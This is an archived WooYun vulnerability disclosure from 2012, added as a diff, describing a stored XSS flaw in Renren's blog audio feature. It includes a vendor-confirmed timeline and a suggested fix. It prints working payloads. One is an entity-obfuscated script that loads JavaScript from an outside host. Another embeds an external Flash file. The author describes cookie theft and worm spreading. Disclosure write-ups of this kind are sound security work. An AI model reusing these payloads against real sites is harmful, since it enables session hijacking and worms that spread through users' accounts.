@@ -1,0 +1,310 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		人人网日志功能存储型XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		人人网日志功能存储型XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-08-09 02:17</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-08-09：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-08-09：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-08-19：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-08-29：	细节向普通白帽子公开<br/>
+									2012-09-08：	细节向实习白帽子公开<br/>
+									2012-09-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">人人回来了～ 前来祝贺的～</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">大致流程如下：<br />
+<br />
+<br />
+<br />
+1. 首先，我们发表一个正常的日志，添加视频/音频，因为想试试能不能直接调用外部FLASH，因此输入http://xsst.sinaapp.com/Xss.swf#.mp3进行测试<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/090048234d00c9732d2f4d40733ddb0c8e7dd67b.jpg" target="_blank"><img src="../images/090048234d00c9732d2f4d40733ddb0c8e7dd67b.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. 发布成功后，我们可以看到出现一个MP3播放器。于是在源码里找找我们输出的内容。<br />
+<br />
+<br />
+<br />
+3. 搜索xsst(我FLASH文件的网址的特征), 没找到embed标签，但是却定位到了一个img标签，而且我们所输入的内容，放在了img的alt标签。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/090048406410d68c43308d11e651794edb219b05.jpg" target="_blank"><img src="../images/090048406410d68c43308d11e651794edb219b05.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4. 到这里我们可以大胆猜测。人人的开发人员，肯定是先读取页面里的img标签，然后获取alt属性，最后再 innerHTML=&quot;&lt;embed src=&#039;&quot;+img.alt+&quot;&#039;.....&gt;&lt;/embed&gt;&quot; 的方式输出内容。<br />
+<br />
+<br />
+<br />
+5. 我们定位到FLASH文件上，不难看到，确实是如此。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/090048573609886d88fef30b5b13cc4b6121a415.jpg" target="_blank"><img src="../images/090048573609886d88fef30b5b13cc4b6121a415.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+6. 既然如此，如果人人的开发人员，在获取alt属性之后，alt属性里的&amp;quot;等会自动转义为&quot;等字符， 如果没有进行二次过滤，就直接innerHTML输出的话，就会导致XSS。<br />
+<br />
+<br />
+<br />
+7. 先试下，会“侧漏“不～～～<br />
+<br />
+<br />
+<br />
+抓包，字段body从<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;p&gt;&lt;img title=&quot;audio-media&quot; class=&quot;audio&quot; src=&quot;http://s.xnimg.cn/imgpro/editor/audio.gif&quot; border=&quot;0&quot; alt=&quot;mp3;http://xsst.sinaapp.com/Xss.swf#.mp3&quot; /&gt;&lt;/p&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+修改为<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;p&gt;&lt;img title=&quot;audio-media&quot; class=&quot;audio&quot; src=&quot;http://s.xnimg.cn/imgpro/editor/audio.gif&quot; border=&quot;0&quot; alt=&quot;mp3;http://xsst.sinaapp.com/Xss.swf&amp;quot;&amp;gt;#.mp3&quot; /&gt;&lt;/p&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+8. 果然从 #.mp3处侧漏啦，有戏～<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/09005450ea15d7afba7c73227445ec0b1c14bb25.jpg" target="_blank"><img src="../images/09005450ea15d7afba7c73227445ec0b1c14bb25.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+9. 继续构造利用代码。用俺工具，经过2步转换得到利用代码 （工具地址：http://app.baidu.com/app/enter?appid=280383） 分享下，不算广告吧= = <br />
+<br />
+<br />
+<br />
+步骤一：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/09005534b262f413542c4efcea21e0f3441292ca.jpg" target="_blank"><img src="../images/09005534b262f413542c4efcea21e0f3441292ca.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+步骤二：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0900555171749e407aba9e5a464ae454a523271c.jpg" target="_blank"><img src="../images/0900555171749e407aba9e5a464ae454a523271c.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+得到的利用代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;p&gt;&lt;img title=&quot;audio-media&quot; class=&quot;audio&quot; src=&quot;http://s.xnimg.cn/imgpro/editor/audio.gif&quot; border=&quot;0&quot; alt=&quot;mp3;http://xsst.sinaapp.com/Xss.swf&amp;quot;&amp;gt;&amp;#60;&amp;#105;&amp;#109;&amp;#103;&amp;#47;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#49;&amp;#32;&amp;#111;&amp;#110;&amp;#101;&amp;#114;&amp;#114;&amp;#111;&amp;#114;&amp;#61;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#115;&amp;#61;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#114;&amp;#101;&amp;#97;&amp;#116;&amp;#101;&amp;#69;&amp;#108;&amp;#101;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#40;&amp;#83;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;#46;&amp;#102;&amp;#114;&amp;#111;&amp;#109;&amp;#67;&amp;#104;&amp;#97;&amp;#114;&amp;#67;&amp;#111;&amp;#100;&amp;#101;&amp;#40;&amp;#49;&amp;#49;&amp;#53;&amp;#44;&amp;#57;&amp;#57;&amp;#44;&amp;#49;&amp;#49;&amp;#52;&amp;#44;&amp;#49;&amp;#48;&amp;#53;&amp;#44;&amp;#49;&amp;#49;&amp;#50;&amp;#44;&amp;#49;&amp;#49;&amp;#54;&amp;#41;&amp;#41;&amp;#59;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#115;&amp;#46;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#83;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;#46;&amp;#102;&amp;#114;&amp;#111;&amp;#109;&amp;#67;&amp;#104;&amp;#97;&amp;#114;&amp;#67;&amp;#111;&amp;#100;&amp;#101;&amp;#40;&amp;#49;&amp;#48;&amp;#52;&amp;#44;&amp;#49;&amp;#49;&amp;#54;&amp;#44;&amp;#49;&amp;#49;&amp;#54;&amp;#44;&amp;#49;&amp;#49;&amp;#50;&amp;#44;&amp;#53;&amp;#56;&amp;#44;&amp;#52;&amp;#55;&amp;#44;&amp;#52;&amp;#55;&amp;#44;&amp;#49;&amp;#50;&amp;#48;&amp;#44;&amp;#49;&amp;#49;&amp;#53;&amp;#44;&amp;#49;&amp;#49;&amp;#53;&amp;#44;&amp;#49;&amp;#49;&amp;#54;&amp;#44;&amp;#52;&amp;#54;&amp;#44;&amp;#49;&amp;#49;&amp;#53;&amp;#44;&amp;#49;&amp;#48;&amp;#53;&amp;#44;&amp;#49;&amp;#49;&amp;#48;&amp;#44;&amp;#57;&amp;#55;&amp;#44;&amp;#57;&amp;#55;&amp;#44;&amp;#49;&amp;#49;&amp;#50;&amp;#44;&amp;#49;&amp;#49;&amp;#50;&amp;#44;&amp;#52;&amp;#54;&amp;#44;&amp;#57;&amp;#57;&amp;#44;&amp;#49;&amp;#49;&amp;#49;&amp;#44;&amp;#49;&amp;#48;&amp;#57;&amp;#44;&amp;#52;&amp;#55;&amp;#44;&amp;#49;&amp;#49;&amp;#48;&amp;#44;&amp;#49;&amp;#49;&amp;#49;&amp;#44;&amp;#52;&amp;#54;&amp;#44;&amp;#49;&amp;#48;&amp;#54;&amp;#44;&amp;#49;&amp;#49;&amp;#53;&amp;#41;&amp;#59;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#97;&amp;#112;&amp;#112;&amp;#101;&amp;#110;&amp;#100;&amp;#67;&amp;#104;&amp;#105;&amp;#108;&amp;#100;&amp;#40;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#115;&amp;#41;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#62;#.mp3&quot; /&gt;&lt;/p&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+10. 可是意外出现啦，看来人人网在服务器上还做了某些判断，俺的代码出发了它们的过滤规则，有以下提示信息。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/090056199b4e3223a337a1707ede2970685f4c45.jpg" target="_blank"><img src="../images/090056199b4e3223a337a1707ede2970685f4c45.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+11. 但是这个阻碍不了我们前进的步伐，既然如此，那我们就换个方式，直接用flash来，构造以下利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;p&gt;&lt;img title=&quot;audio-media&quot; class=&quot;audio&quot; src=&quot;http://s.xnimg.cn/imgpro/editor/audio.gif&quot; border=&quot;0&quot; alt=&quot;mp3;http://itsokla.duapp.com/Xss.swf&amp;quot;&gt;&lt;/object&gt;&lt;embed src=&amp;quot;http://itsokla.duapp.com/Xss.swf&amp;quot;type=&amp;quot;application/x-shockwave-flash&amp;quot;allowscriptaccess=&amp;quot;always&amp;quot;&gt;&lt;i a=&amp;quot;#.mp3&quot; /&gt;&lt;/p&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+12. 可以看到成功发表日志。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/090056505dd0662cc7c92b0f22ed74956fb98bc5.jpg" target="_blank"><img src="../images/090056505dd0662cc7c92b0f22ed74956fb98bc5.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/090056328e2db1a3251a6d6f83da8e611713c0dd.jpg" target="_blank"><img src="../images/090056328e2db1a3251a6d6f83da8e611713c0dd.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+13. httpwatch对日志页面抓包可以看到，成功通过FLASH调用外部JS文件。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/090057050ceebe94ea0ef0e3ab86fda8351f79fa.jpg" target="_blank"><img src="../images/090057050ceebe94ea0ef0e3ab86fda8351f79fa.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+14. 至于漏洞危害：<br />
+<br />
+<br />
+<br />
+A. 由于发布日志无验证码，且和XSS处于同一个域下，因而可以直接ajax让受害者自动发布日志，从而进行日志蠕虫<br />
+<br />
+B. 人人网的cookies没有加http-only防护，因而可以得到cookies后，在其它域做某些某些事情。举个例子，比如我就用这个XSS让访问日志的用户，自动进行某个第三方应用的Oauth的认证。这里就不给出具体的利用代码了 。。<br />
+<br />
+<br />
+<br />
+以下是获取他人cookies的截图： （未做有害事情，仅测试用途）<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/09005728fe0235245fa639085bcacc4ad2f97892.jpg" target="_blank"><img src="../images/09005728fe0235245fa639085bcacc4ad2f97892.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">在获取日志内容中&lt;img class=&quot;audio&quot; src=&quot;http://s.xnimg.cn/imgpro/editor/audio.gif&quot; border=&quot;0&quot; alt=&quot;mp3;mp3地址&quot;&gt; 标记的 alt 属性后， 对值进行再次过滤，再以innerHTML方式输出。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-010719" title="人人网日志功能存储型XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-08-09 05:42</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">很巧妙，感谢!</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="10719";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
